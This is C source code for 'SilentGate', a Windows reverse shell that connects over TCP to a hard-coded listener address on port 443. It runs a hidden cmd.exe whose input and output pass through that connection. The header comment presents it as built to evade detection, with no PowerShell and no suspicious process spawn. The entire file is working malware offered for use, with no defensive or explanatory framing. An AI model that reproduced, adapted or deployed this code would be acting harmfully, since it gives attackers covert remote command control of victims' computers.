/*
 * SilentGate - Direct C Reverse Shell
 * Author: JarDani
 * Direct TCP connection - no PowerShell - no suspicious spawn
 */
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define LHOST "192.168.217.146"
#define LPORT 443

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
                         NULL, 0, 0);

    struct sockaddr_in sa;
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons(LPORT);
    sa.sin_addr.s_addr = inet_addr(LHOST);

    if(connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0)
        return 1;

    /* Redirect stdin/stdout/stderr to socket */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError  = (HANDLE)s;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(s);
    WSACleanup();
    return 0;
}
